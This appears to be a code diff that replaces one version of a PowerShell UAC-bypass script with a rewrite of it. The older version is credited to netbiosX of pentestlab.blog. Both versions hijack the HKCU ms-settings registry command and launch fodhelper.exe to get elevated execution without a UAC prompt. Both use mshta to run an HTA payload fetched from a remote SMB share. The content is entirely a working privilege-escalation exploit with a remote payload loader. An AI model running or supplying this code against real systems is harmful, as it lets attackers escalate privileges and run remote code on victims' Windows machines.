@@ -1,45 +1,45 @@
-<#
-.SYNOPSIS  
-    This script can bypass User Access Control (UAC) via fodhelper.exe
-　
-    It creates a new registry structure in: "HKCU:\Software\Classes\ms-settings\" to perform UAC bypass and starts 
-    an elevated command prompt. 
-    　
-.NOTES  
-    Function   : FodhelperUACBypass
-    File Name  : FodhelperUACBypass.ps1 
-    Author     : netbiosX. - pentestlab.blog 
-　
-.LINKS          
-    https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692
-    https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/    
-　
-.EXAMPLE  
-　
-     Load "cmd /c start C:\Windows\System32\cmd.exe" (it's default):
-     FodhelperUACBypass 
-　
-     Load specific application:
-     FodhelperUACBypass -program "cmd.exe"
-     FodhelperUACBypass -program "cmd.exe /c powershell.exe"　
-#>
+# Define registry paths and command
+$settings = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
+$cmd = "cmd /c start mshta.exe \\192.168.17.135\MyShare\Downloads\infow.hta"
+$del = ""
 
-function FodhelperUACBypass(){ 
- Param (
-           
-        [String]$program = "cmd /c start mshta.exe \\192.168.17.135\MyShare\Downloads\infow.hta" #default
-       )
-　
-    #Create Registry Structure
-    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
-    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
-　
-    #Start fodhelper.exe
-    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
-　
-    #Cleanup
-    Start-Sleep 3
-    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
-　
+# Attempt to create the registry key
+try {
+    New-Item -Path $settings -Force | Out-Null
+    Write-Host "Successfully created registry key"
+} catch {
+    Write-Host "Failed to create registry key"
+}
+
+# Set the registry values
+try {
+    Set-ItemProperty -Path $settings -Name "(default)" -Value $cmd
+    Write-Host "Successfully set registry value"
+} catch {
+    Write-Host "Failed to set registry value"
+}
+
+try {
+    Set-ItemProperty -Path $settings -Name "DelegateExecute" -Value $del
+    Write-Host "Successfully set registry value: DelegateExecute"
+} catch {
+    Write-Host "Failed to set registry value: DelegateExecute"
+}
+
+# Start the fodhelper.exe program with elevated privileges
+$sei = New-Object -TypeName System.Diagnostics.ProcessStartInfo
+$sei.FileName = "C:\Windows\System32\fodhelper.exe"
+$sei.Verb = "runas"
+$sei.UseShellExecute = $true
+
+try {
+    $process = [System.Diagnostics.Process]::Start($sei)
+    Write-Host "Successfully created process =^..^="
+} catch {
+    $err = $_.Exception.HResult
+    if ($err -eq -2147467259) {
+        Write-Host "The user refused to allow privileges elevation."
+    } else {
+        Write-Host "Unexpected error! Error code: $err"
+    }
 }
